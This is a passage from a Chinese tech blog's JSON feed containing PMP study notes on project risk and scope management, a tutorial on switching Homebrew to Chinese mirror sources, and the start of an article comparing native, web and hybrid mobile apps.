影响风险态度的因素</h3>\n<p>（1）风险偏好\n（2）风险承受力\n（3）风险的临界值</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-risk-management.png\" alt=\"项目风险管理\"></p>\n<h2 id=\"如何做好项目风险管理\" tabindex=\"-1\"> 如何做好项目风险管理</h2>\n<p><img src=\"/assets/project-risk-management-0.png\" alt=\"项目风险管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划风险管理\" tabindex=\"-1\"> 规划风险管理</h3>\n<p>规划风险管理是定义如何实施项目风险管理活动的过程。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>风险管理计划：如何安排与实施风险管理活动。风险管理计划无风险。</p>\n<p>主要包括：</p>\n<ul>\n<li>风险类别：通常借助风险分解结构 (RBS)来构建风险类别。RBS 是潜在风险来源的层级展现, 有助于项目团队考虑单个项目风险的全部可能来源,\n对识别风险或归类已识别风险特别有用。</li>\n<li>相关方风险偏好：应在风险管理计划中记录项目关键相关方的风险偏好。</li>\n<li>风险概率和影响定义：根据具体的项目环境, 组织和关键相关方的风险偏好和临界值, 来制定风险概率和影响定义。</li>\n<li>概率和影响矩阵：组织可在项目开始前确定优先级排序规则, 并将其纳入组织过程资产, 或者也可为具体项目量身定制优先级排序规则。</li>\n</ul>\n<p><img src=\"/assets/project-risk-management-1.png\" alt=\"项目风险管理-规划风险管理\"></p>\n<h3 id=\"识别风险\" tabindex=\"-1\"> 识别风险</h3>\n<p>应鼓励所有项目相关方参与单个项目风险的识别工作。识别风险是一个迭代的过程。迭代的频率和每次迭代所需的参与程度因情况而异,\n应在风险管理计划中做出相应规定。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p>SWOT 分析：对项目的优势、劣势、机会和威胁 (SWOT) 进行逐个检查。</p>\n<p>提示清单：可作为框架用于协助项目团队形成想法。用风险分解结构底层的风险类别作为提示清单可以识别单个风险；识别整体项目风险\nPESTLE、TECOP、VUCA。</p>\n<p>风险登记册：记录已识别单个项目风险的详细信息。包括：已识别风险的清单、潜在风险责任人、潜在风险应对措施清单。</p>\n<p><img src=\"/assets/project-risk-management-2.png\" alt=\"项目风险管理-识别风险\"></p>\n<h3 id=\"实施定性风险分析\" tabindex=\"-1\"> 实施定性风险分析</h3>\n<p>评估单个项目风险发生的概率和影响以及其他特征, 对风险进行优先级排序, 从而为后续分析或行动提供基础的过程。主要作用是重点关注高优先级的风险。</p>\n<p>本过程会为每个风险识别出责任人, 以便由他们负责规划风险应对措施, 并确保应对措施的实施。</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p>风险概率和影响评估：概率评估考虑的是特定风险发生的可能性, 影响评估考虑的是风险对一项或多项项目目标的潜在影响。低概率和影响的风险将被列入风险登记册中的观察清单,\n以供未来监控。</p>\n<p><img src=\"/assets/project-risk-management-3.png\" alt=\"项目风险管理-实施定性风险分析\"></p>\n<h3 id=\"实施定量风险分析\" tabindex=\"-1\"> 实施定量风险分析</h3>\n<p>量化整体项目风险敞口, 并提供额外的定量风险信息, 以支持风险应对规划。</p>\n<p>并非所有项目都需要实施定量风险分析。</p>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p>敏感性分析：确定哪些单个项目风险或其他不确定性来源对项目结果具有最大的潜在影响。敏感性分析的结果通常用龙卷风图来表示。</p>\n<p>决策树分析：用决策树在若干备选行动方案中选择一个最佳方案（EMV 预期货币价值分析）</p>\n<p><img src=\"/assets/project-risk-management-4.png\" alt=\"项目风险管理-实施定量风险分析\"></p>\n<h3 id=\"规划风险应对\" tabindex=\"-1\"> 规划风险应对</h3>\n<p>制定可选方案、选择应对策略并商定应对行动的过程。主要作用是, 制定应对整体项目风险和单个项目风险的适当方法；还将分配资源,\n并根据需要将相关活动添加进项目文件和项目管理计划。</p>\n<ul>\n<li>次生风险 =&gt; 实施风险应对措施的直接结果, 由于应对一个风险而产生的另一个风险</li>\n<li>残余风险 =&gt; 执行风险应对计划后仍然残留的风险, 通常是可接受的</li>\n</ul>\n<h4 id=\"威胁应对策略\" tabindex=\"-1\"> 威胁应对策略</h4>\n<table>\n<thead>\n<tr>\n<th>策略类别</th>\n<th>定义</th>\n<th>举例</th>\n<th>注意点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上报</td>\n<td>风险将在更高层面加以管理</td>\n<td>上报（一旦上报, 项目团队不再进一步监督）</td>\n<td>相关人员必须愿意承担应对责任</td>\n</tr>\n<tr>\n<td>规避</td>\n<td>消除威胁</td>\n<td>延长进度、改变策略、缩小范围、澄清需求、获取信息、改善沟通、取得专有技能</td>\n<td>适用于高优先级威胁</td>\n</tr>\n<tr>\n<td>转移</td>\n<td>转移给第三方</td>\n<td>保险、履约保函、 担保、外包</td>\n<td>需要支付风险转移费用。 转移风险是把风险管理责任简单地推给另一方, 而并非消除风险</td>\n</tr>\n<tr>\n<td>减轻</td>\n<td>降低威胁发生的概率和（或）影响</td>\n<td>更简单的流程、更多的测试、更可靠的卖方、原型开发、加入冗余部件</td>\n<td>不利风险的概率和/或影响降低到可接受的临界值范围</td>\n</tr>\n<tr>\n<td>接收</td>\n<td>承认威胁的存在, 但不主动采取措施</td>\n<td>主动接受：建立应急储备； 被动接受：记录策略, 定期复查</td>\n<td>适用于低优先级威胁</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"机会应对策略\" tabindex=\"-1\"> 机会应对策略</h4>\n<table>\n<thead>\n<tr>\n<th>策略类别</th>\n<th>定义</th>\n<th>举例</th>\n<th>注意点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上报</td>\n<td>风险将在更高层面加以管理</td>\n<td>上报（一旦上报, 项目团队不再进一步监督）</td>\n<td>相关人员必须愿意承担应对责任</td>\n</tr>\n<tr>\n<td>开拓</td>\n<td>让机会 100%发生</td>\n<td>把组织中最有能力的资源分配给项目来缩短完成时间； 采用全新或升级的技术来节约成本 （牛 X 的人或技术）</td>\n<td>适用于高优先级机会</td>\n</tr>\n<tr>\n<td>分享</td>\n<td>转移给第三方, 使其享有机会所带来的部分收益</td>\n<td>建立合伙关系、合作团队、特殊公司、合资企业</td>\n<td>必须为已分享的机会安排新的风险责任人（最有能力抓住机会的人）</td>\n</tr>\n<tr>\n<td>提高</td>\n<td>提高机会出现的概率和（或）影响</td>\n<td>为早日完成活动而增加资源（普通人）</td>\n<td>不利风险的概率和/或影响降低到可接受的临界值范围</td>\n</tr>\n<tr>\n<td>接收</td>\n<td>承认机会的存在, 但不主动采取措施。</td>\n<td>主动接受：建立应急储备； 被动接受：记录策略, 无需任何其他行动, 需要定期复查</td>\n<td>适用于低优先级机会</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"itto-4\" tabindex=\"-1\"> ITTO</h4>\n<p>应急应对策略：仅在特定事件发生时才采用的应对措施。包括应急计划和弹回计划。</p>\n<p>风险登记册：</p>\n<ol>\n<li>商定的应对策略、实施应对策略所需的具体行动</li>\n<li>风险发生的触发条件、征兆和预警信号</li>\n<li>实施所选 应对策略所需的预算和进度活动</li>\n<li>应急计划、弹回计划、残余风险、次生风险</li>\n</ol>\n<p><img src=\"/assets/project-risk-management-5.png\" alt=\"项目风险管理-规划风险应对\"></p>\n<h2 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h2>\n<h3 id=\"实施风险应对\" tabindex=\"-1\"> 实施风险应对</h3>\n<p>实施风险应对是执行商定的风险应对计划的过程。本过程的主要作用是, 确保按计划执行商定的风险应对措施。</p>\n<h4 id=\"itto-5\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-risk-management-6.png\" alt=\"项目风险管理-实施风险应对\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"监督风险\" tabindex=\"-1\"> 监督风险</h3>\n<p>在整个项目期间, 监督商定的风险应对计划的实施、跟踪已识别风险、识别和分析新风险, 以及评估风险管理有效性的过程。</p>\n<h4 id=\"itto-6\" tabindex=\"-1\"> ITTO</h4>\n<p>技术绩效分析：把技术成果与取得技术成果的计划进行比较。实际结果偏离计划的程度可以代表威胁或机会的潜在影响。</p>\n<p>储备分析：在项目的任一时点比较剩余应急储备与剩余风险量, 从而确定剩余储备是否仍然合理。</p>\n<p>风险审计：评估风险管理过程的有效性。项目经理负责确保按项目风险管理计划所规定的频率开展风险审计。</p>\n<p><img src=\"/assets/project-risk-management-7.png\" alt=\"项目风险管理-监督风险\"></p>\n<h2 id=\"答题技巧\" tabindex=\"-1\"> 答题技巧</h2>\n<p>首先看是“识别了风险”还是“风险发生了”。</p>\n<ul>\n<li>如是“识别了风险”, 则更新风险登记册, 或者, 查阅风险登记册、记录在风险登记册。</li>\n<li>如是“发生了风险”, 则确定是“已知”风险还是“未知”风险：</li>\n<li>已知风险：查阅风险登记册, 直接应对；如果要使用储备, 一般是使用应急储备。</li>\n<li>未知风险：采取权变措施, 提交变更请求, 使用管理储备。</li>\n</ul>\n<p>如果是“已知”风险, 但是应对无效, 同样需要权变, 提交变更请求, 使用管理储备。</p>\n<p>风险管理的顺序如下：1.识别 2.定性（必须要做）3.定量（可以不做）4.规划应对 5.实施应对</p>\n",
      "image": "https://vxhly.github.io/assets/project-risk-management.png",
      "date_published": "2022-07-28T21:50:00.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第五章：项目范围管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-scope-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-scope-management.html",
      "summary": "前言\n记录项目范围管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目范围管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目范围管理是指确保项目包括成功完成项目所需的功全部工作, 但又只包括必须完成的工作的各个过程, 一句话概括为：做且只做该做的事,\n不该做的不做。</p>\n</div>\n<ul>\n<li>项目范围管理包括做且只做所需的全部工作。</li>\n<li>“范围” = 产品范围+项目范围\n<ul>\n<li>产品范围 =&gt; 某项产品、服务或成果所具有的特性和功能；完成情况是根据产品需求来衡量的</li>\n<li>项目范围 =&gt; 为交付具有规定特性与功能的产品、服务或成果而必须完成的工作；完成情况是根据项目管理计划来衡量的</li>\n</ul>\n</li>\n<li>需求\n<ul>\n<li>产品、服务或成果必须具备的条件或能力</li>\n<li>已量化且书面记录的需要和期望</li>\n<li>项目执行开始后对其进行测量</li>\n<li>工作分解结构（WBS）的基础</li>\n<li>发起人、客户和其他相关方收集并衡量</li>\n</ul>\n</li>\n</ul>\n<p>项目范围说明书的组成部分：</p>\n<p>（1）产品范围描述\n（2）验收标准\n（3）可交付成果\n（4）除外责任</p>\n<p>可交付成果和验收标准 =&gt; 首选范围说明书, 次选 WEB 词典, 再次选范围基准</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-scope-management.png\" alt=\"项目范围管理\"></p>\n<h2 id=\"如何做好项目范围管理\" tabindex=\"-1\"> 如何做好项目范围管理</h2>\n<p><img src=\"/assets/project-scope-management-0.png\" alt=\"项目范围管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划范围管理\" tabindex=\"-1\"> 规划范围管理</h3>\n<ul>\n<li>范围管理计划（指南）：描述如何定义、制定、监督、控制和确认项目范围\n<ul>\n<li>范围管理计划无范围, 范围是记录在范围基准中的</li>\n</ul>\n</li>\n<li>需求管理计划：描述如何分析、记录和管理项目和产品需求\n<ul>\n<li>需求管理计划无需求, 需求是记录在需求文件中的</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-1.png\" alt=\"项目范围管理-规划范围管理\"></p>\n<h3 id=\"收集需求\" tabindex=\"-1\"> 收集需求</h3>\n<p>需求是指根据特定协议或其他强制性规范, 产品、服务或成果必须具备的条件或能力。</p>\n<ul>\n<li>\n<p>需求 =&gt; 需求是一种需要</p>\n</li>\n<li>\n<p>范围 =&gt; 范围是满足“需求”必须交付的可交付成果和相关工作</p>\n</li>\n<li>\n<p>需求文件：需求文件描述各种单一需求将如何满足与项目相关的业务需求。</p>\n</li>\n<li>\n<p>需求跟踪矩阵：需求跟踪矩阵是把产品需求从其来源连接到能满足需求的可交付成果的一种表格。</p>\n</li>\n</ul>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-2.png\" alt=\"项目范围管理-收集需求\"></p>\n<h3 id=\"定义范围\" tabindex=\"-1\"> 定义范围</h3>\n<p>定义范围是制定项目和产品详细描述的过程。本过程的主要作用是, 描述产品、服务或成果的边界和验收标准。可减少客户改动范围。</p>\n<p>项目范围说明书：记录了整个范围, 包括项目和产品范围；详细描述了项目的可交付成果；还代表项目相关方之间就项目范围所达成的共识。</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-3.png\" alt=\"项目范围管理-定义范围\"></p>\n<h3 id=\"创建-wbs\" tabindex=\"-1\"> 创建 WBS</h3>\n<p>把项目可交付成果和项目工作分解成较小、更易于管理的组件的过程。</p>\n<p>WBS 组织并定义了项目的总范围, 代表着经批准的当前项目范围说明书中所规定的工作。WBS 最低层的组成部分称为工作包。</p>\n<p>WBS 最低层的组成部分称为工作包, 其中包括计划的工作。</p>\n<p>项目范围说明书：描述了需要实施的工作及不包含在项目中的工作。</p>\n<p>需求文件：需求文件详细描述了各种单一需求如何满足项目的业务需要</p>\n<p>范围基准：经过批准的范围说明书、WBS 和相应的 WBS 词典。</p>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-4.png\" alt=\"项目范围管理-创建 WBS\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"确认范围\" tabindex=\"-1\"> 确认范围</h3>\n<p>确认范围过关注可交付成果的验收, 而控制质量关注可交付成果的正确性及是否满足质量要求。控制质量过程通常先于确认范围过程,\n但二者也可同时进行。</p>\n<p>核实的可交付成果：核实的可交付成果是指已经完成, 并被控制质量过程检查为正确的可交付成果。</p>\n<p>确认项目可交付成果是否符合产品验收标准并满足客户的期望。</p>\n<h4 id=\"itto-4\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-5.png\" alt=\"项目范围管理-确认范围\"></p>\n<h3 id=\"控制范围\" tabindex=\"-1\"> 控制范围</h3>\n<p>属于变更流程。</p>\n<p>控制范围是监督项目和产品的范围状态, 管理范围基准变更的过程。本过程的主要作用是, 在整个项目期间保持对范围基准的维护。</p>\n<h3 id=\"范围蔓延、镀金、范围潜变\" tabindex=\"-1\"> 范围蔓延、镀金、范围潜变</h3>\n<div><p>范围蔓延</p>\n<ul>\n<li>未对时间、成本和资源做相应调整，未经控制的产品或项目范围的扩大。</li>\n<li>来自团队内部原因造成的范围蔓延称为“镀金”。</li>\n<li>来自团队外部原因造成的范围蔓延称为“范围潜变”。</li>\n</ul>\n</div>\n<div><p>镀金</p>\n<p>项目人员为了“讨好”客户而做的不解决实际问题、没有应用价值的项目活动。</p>\n</div>\n<div><p>范围潜变</p>\n<p>范围潜变是指客户不断提出小的、不易察觉的范围改变，如果不加控制，累计起来导致项目严重偏离既定的范围基准，导致项目失控和失败。</p>\n</div>\n<p>如果已经出现了范围蔓延，需要停止不良变更，补变更流程。如果变更没有获得批准，需要取消不良变更。</p>\n<h4 id=\"itto-5\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-scope-management-6.png\" alt=\"项目范围管理-确认范围\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-scope-management.png",
      "date_published": "2022-07-18T21:00:00.000Z",
      "date_modified": "2022-09-14T09:54:21.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "Mac 下 brew 切换为国内源",
      "url": "https://vxhly.github.io/views/liunx/HomeBrew-change-source.html",
      "id": "https://vxhly.github.io/views/liunx/HomeBrew-change-source.html",
      "summary": "前言\nHomebrew 是一款自由及开放源代码的软件包管理系统, 用以简化 macOS 和 linux 系统上的软件安装过程。以下是提供 Homebrew 的国内切源方法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Homebrew 是一款自由及开放源代码的软件包管理系统, 用以简化 macOS 和 linux 系统上的软件安装过程。以下是提供 Homebrew 的国内切源方法。</p>\n</div>\n\n<h2 id=\"简介\" tabindex=\"-1\"> 简介</h2>\n<p>Homebrew 是一款自由及开放源代码的软件包管理系统, 用以简化 macOS 和 linux 系统上的软件安装过程。它拥有安装、卸载、更新、查看、搜索等很多实用的功能, 通过简单的一条指令, 就可以实现包管理, 十分方便快捷。</p>\n<p><code>Homebrew</code> 主要有四个部分组成: <code>brew</code>、<code>homebrew-core</code> 、<code>homebrew-bottles</code>、<code>homebrew-cask</code>。</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>brew</td>\n<td>Homebrew 源代码仓库</td>\n</tr>\n<tr>\n<td>homebrew-core</td>\n<td>Homebrew 核心软件仓库</td>\n</tr>\n<tr>\n<td>homebrew-bottles</td>\n<td>Homebrew 预编译二进制软件包</td>\n</tr>\n<tr>\n<td>homebrew-cask</td>\n<td>提供 macOS 应用和大型二进制文件</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"查看本地的源\" tabindex=\"-1\"> 查看本地的源</h2>\n<div><pre><code><span># 查看 brew.git 当前源</span>\n$ <span>cd</span> <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span> <span>&amp;&amp;</span> <span>git</span> remote -v\norigin    https://github.com/Homebrew/brew.git <span>(</span>fetch<span>)</span>\norigin    https://github.com/Homebrew/brew.git <span>(</span>push<span>)</span>\n\n<span># 查看 homebrew-core.git 当前源</span>\n$ <span>cd</span> <span>\"<span><span>$(</span>brew --repo homebrew/core<span>)</span></span>\"</span> <span>&amp;&amp;</span> <span>git</span> remote -v\norigin    https://github.com/Homebrew/homebrew-core.git <span>(</span>fetch<span>)</span>\norigin    https://github.com/Homebrew/homebrew-core.git <span>(</span>push<span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"替换为阿里源\" tabindex=\"-1\"> 替换为阿里源</h2>\n<div><pre><code><span># 修改 brew.git 为阿里源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span> remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git\n\n<span># 修改 homebrew-core.git 为阿里源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/core<span>)</span></span>\"</span> remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git\n\n<span># zsh 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.zshrc\n$ <span>source</span> ~/.zshrc\n\n<span># bash 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles'</span> <span>>></span> ~/.bash_profile\n$ <span>source</span> ~/.bash_profile\n\n<span># 刷新源</span>\n$ brew update\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"替换为清华源\" tabindex=\"-1\"> 替换为清华源</h2>\n<div><pre><code><span># 替换各个源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span> remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/core<span>)</span></span>\"</span> remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/cask<span>)</span></span>\"</span> remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git\n\n<span># zsh 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles'</span> <span>>></span> ~/.zshrc\n$ <span>source</span> ~/.zshrc\n\n<span># bash 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles'</span> <span>>></span> ~/.bash_profile\n$ <span>source</span> ~/.bash_profile\n\n<span># 刷新源</span>\n$ brew update\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"替换为中科大源\" tabindex=\"-1\"> 替换为中科大源</h2>\n<div><pre><code><span># 替换各个源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span> remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/core<span>)</span></span>\"</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/cask<span>)</span></span>\"</span> remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n\n<span># zsh 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> <span>>></span> ~/.zshrc\n$ <span>source</span> ~/.zshrc\n\n<span># bash 替换 brew bintray 镜像</span>\n$ <span>echo</span> <span>'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> <span>>></span> ~/.bash_profile\n$ <span>source</span> ~/.bash_profile\n\n<span># 刷新源</span>\n$ brew update\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"重置为官方源\" tabindex=\"-1\"> 重置为官方源</h2>\n<div><pre><code><span># 重置 brew.git 为官方源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo<span>)</span></span>\"</span> remote set-url origin https://github.com/Homebrew/brew.git\n\n<span># 重置 homebrew-core.git 为官方源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/core<span>)</span></span>\"</span> remote set-url origin https://github.com/Homebrew/homebrew-core.git\n\n<span># 重置 homebrew-cask.git 为官方源</span>\n$ <span>git</span> -C <span>\"<span><span>$(</span>brew --repo homebrew/cask<span>)</span></span>\"</span> remote set-url origin https://github.com/Homebrew/homebrew-cask\n\n<span># zsh 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置</span>\n$ <span>vi</span> ~/.zshrc\n<span># export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx</span>\n\n<span># bash 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置</span>\n$ <span>vi</span> ~/.bash_profile\n<span># export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx</span>\n\n<span># 刷新源</span>\n$ brew update\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-09-10T14:04:39.000Z",
      "date_modified": "2022-08-22T11:52:59.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "APP开发-概念篇",
      "url": "https://vxhly.github.io/views/app/app-develop-concept.html",
      "id": "https://vxhly.github.io/views/app/app-develop-concept.html",
      "summary": "前言\n表面上看, 手机 App 都是同样的东西, 就是手机上的应用程序, 点击图标就能运行, 但是它们的底层技术不一样。接下本篇将介绍一下常见的 APP 开发技术以及其的优缺点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>表面上看, 手机 App 都是同样的东西, 就是手机上的应用程序, 点击图标就能运行, 但是它们的底层技术不一样。接下本篇将介绍一下常见的 APP 开发技术以及其的优缺点。</p>\n</div>\n\n<h2 id=\"文章著作权声明\" tabindex=\"-1\"> 文章著作权声明</h2>\n<div><p>注意</p>\n<p>声明以下内容摘自原文 <a href=\"https://www.ruanyifeng.com/blog/2019/12/hybrid-app-concepts.html\" target=\"_blank\" rel=\"noopener noreferrer\">H5 手机 App 开发入门：概念篇</a></p>\n</div>\n<h2 id=\"分类\" tabindex=\"-1\"> 分类</h2>\n<p>按照 APP 的开发技术, APP 大概可以分为以下三类</p>\n<div><p>App 分类</p>\n<ul>\n<li>原生应用（native application, 简称 Native App）</li>\n<li>Web 应用（web application, 简称 Web App）</li>\n<li>混合应用（hybrid application, 简称 Hybrid App）</li>\n</ul>\n</div>\n<h2 id=\"优缺点对比\" tabindex=\"-1\"> 优缺点对比</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>Native APP</th>\n<th>Web APP</th>\n<th>Hybrid APP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>开发语言</td>\n<td>原生语言（Objective-C、Java、. Net）</td>\n<td>网页语言（HTML5+CSS+JS）</td>\n<td>原生语言+网页语言</td>\n</tr>\n<tr>\n<td>跨平台性</td>\n<td>低</td>\n<td>高</td>\n<td>高</td>\n</tr>\n<tr>\n<td>设备访问能力</td>\n<td>高</td>\n<td>低</td>\n<td>高</td>\n</tr>\n<tr>\n<td>开发成本</td>\n<td>高</td>\n<td>低</td>\n<td>中</td>\n</tr>\n<tr>\n<td>用户体验</td>\n<td>好</td>\n<td>差</td>\n<td>较好</td>\n</tr>\n<tr>\n<td>安装体验</td>\n<td>高（通过应用商店安装）</td>\n<td>中（通过移动浏览器）</td>\n<td>高（通过应用商店安装）</td>\n</tr>\n<tr>\n<td>升级灵活度</td>\n<td>低（总通过应用商店升级）</td>\n<td>高</td>\n<td>中（总通过应用商店升级）</td>\n</tr>\n<tr>\n<td>向后兼容</td>\n<td>差</td>\n<td>好</td>\n<td>好</td>\n</tr>\n<tr>\n<td>维护更新</td>\n<td>复杂</td>\n<td>简单</td>\n<td>简单</td>\n</tr>\n<tr>\n<td>高级图形</td>\n<td>高</td>\n<td>中</td>\n<td>中</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"native-app\" tabindex=\"-1\"> Native App</h2>\n<div><p>定义</p>\n<p>Native App 是一种基于智能手机本地操作系统如 iOS、Android、WP 并使用原生程式编写运行的第三方应用程序, 也叫本地 App。原生 App 使用与手机操作系统相同的语言。iOS 的原生 App 使用 Objective-C 语言或 Swift 语言, 安卓使用 Java 语言或 Kotlin 语言。由于跟底层系统的语言和技术模型一致, 所以原生 App 的性能和用户体验都很好。</p>\n</div>\n<h3 id=\"优缺点\" tabindex=\"-1\"> 优缺点</h3>\n<h4 id=\"优点\" tabindex=\"-1\"> 优点</h4>\n<ol>\n<li>较好的性能和体验</li>\n<li>可以使用系统的所有硬件和软件 API, 比如 GPS、摄像头、麦克风、加速计、通知推送等等, 能充分发挥系统的潜力</li>\n</ol>\n<h4 id=\"缺点\" tabindex=\"-1\"> 缺点</h4>\n<ol>\n<li>开发成本高, 每个手机平台都要建立一个独立的开发团队, 一般都有 iOS 和安卓两个开发团队。如果出现第三个平台（以前的 Windows Phone, 也许将来的华为鸿蒙 OS）, 就要组建第三个团队, 成本就更高。</li>\n<li>原生 App 使用底层操作系统的语言, 都是很重的编译型语言, 开发和调试成本相对较高, 时间周期长</li>\n<li>原生 App 必须下载安装才能使用, 只要升级版本, 就必须重新下载安装。用户往往不愿意更新版本, 厂商被迫不得不长期支持很久以前的旧版本。</li>\n</ol>\n<h2 id=\"web-app\" tabindex=\"-1\"> Web App</h2>\n<div><p>定义</p>\n<p>WebApp 是指基于 Web 的系统和应用, 其作用是向广大的最终用户发布一组复杂的内容和功能。WebApp 提供一种简单的方式来开始为 App Engine 开发应用程序。Web App 就是运行于网络和标准浏览器上, 基于网页技术开发实现特定功能的应用。</p>\n</div>\n<h3 id=\"优缺点-1\" tabindex=\"-1\"> 优缺点</h3>\n<h4 id=\"优点-1\" tabindex=\"-1\"> 优点</h4>\n<ol>\n<li>不需要下载安装, 打开浏览器就能使用, 而且总是使用最新版本</li>\n<li>对于开发者来说, Web App 写起来比较快, 调试容易, 不需要应用商店的批准就能发布。</li>\n</ol>\n<h4 id=\"缺点-1\" tabindex=\"-1\"> 缺点</h4>\n<ol>\n<li>浏览器提供的 API（即 Web API）很有限（目前只有相机、GPS、电池等少数几个）, 大部分系统硬件都不能通过网页访问, 也无法直接读取硬盘文件, 所以 Web App 无法充分利用平台的硬件。</li>\n<li>网页通过浏览器渲染, 性能不如原生 App, 不适合做性能要求较高的页面。</li>\n</ol>\n<h3 id=\"阻碍推广缘由\" tabindex=\"-1\"> 阻碍推广缘由</h3>\n<p>为了推广 Web App, 谷歌公司的 